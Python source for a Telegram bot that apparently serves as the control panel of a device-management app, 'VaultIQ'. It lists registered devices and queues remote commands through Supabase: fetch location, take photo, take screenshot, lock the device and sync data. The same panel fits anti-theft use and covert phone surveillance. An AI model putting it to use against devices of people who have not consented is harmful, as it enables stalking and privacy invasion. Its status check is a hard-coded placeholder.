import os
import asyncio
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
from supabase import create_client, Client

# --- Configuration ---
# Replace these with actual values from your gradle.properties or dashboard config
SUPABASE_URL = "https://orrdsscvzaginlvmbyow.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." # Replace with full Anon/Service key
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"

# Initialize Supabase
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 VaultIQ Control Bot Active.\nUse /devices to see connected devices.")

async def list_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
    response = supabase.table("devices").select("*").order("last_seen", desc=True).execute()
    devices = response.data

    if not devices:
        await update.message.reply_text("❌ No devices connected yet.")
        return

    keyboard = []
    for device in devices:
        status = "🟢" if True else "🔴" # Logic for status
        keyboard.append([InlineKeyboardButton(f"{status} {device['device_name']} ({device['device_model']})", callback_data=f"select_{device['id']}")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("📱 Select a device to control:", reply_markup=reply_markup)

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    device_id = query.data.split("_")[1]
    context.user_data['selected_device'] = device_id

    keyboard = [
        [InlineKeyboardButton("📍 Fetch Location", callback_data=f"cmd_fetch_location_{device_id}")],
        [InlineKeyboardButton("📸 Take Photo", callback_data=f"cmd_take_photo_{device_id}")],
        [InlineKeyboardButton("🖼️ Take Screenshot", callback_data=f"cmd_take_screenshot_{device_id}")],
        [InlineKeyboardButton("🔒 Lock Device", callback_data=f"cmd_lock_device_{device_id}")],
        [InlineKeyboardButton("🔌 Sync Data", callback_data=f"cmd_sync_data_{device_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text=f"Selected Device: {device_id}\nChoose an action:", reply_markup=reply_markup)

async def command_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    parts = query.data.split("_")
    command = f"{parts[1]}_{parts[2]}" # e.g., take_photo
    device_id = parts[3]

    # Insert command into Supabase
    try:
        supabase.table("commands").insert({
            "device_id": device_id,
            "command": command,
            "status": "pending"
        }).execute()
        await query.edit_message_text(text=f"✅ Command '{command}' broadcasted to device.")
    except Exception as e:
        await query.edit_message_text(text=f"❌ Error sending command: {str(e)}")

if __name__ == '__main__':
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("devices", list_devices))
    app.add_handler(CallbackQueryHandler(device_callback, pattern="^select_"))
    app.add_handler(CallbackQueryHandler(command_callback, pattern="^cmd_"))

    print("Bot is running...")
    app.run_polling()
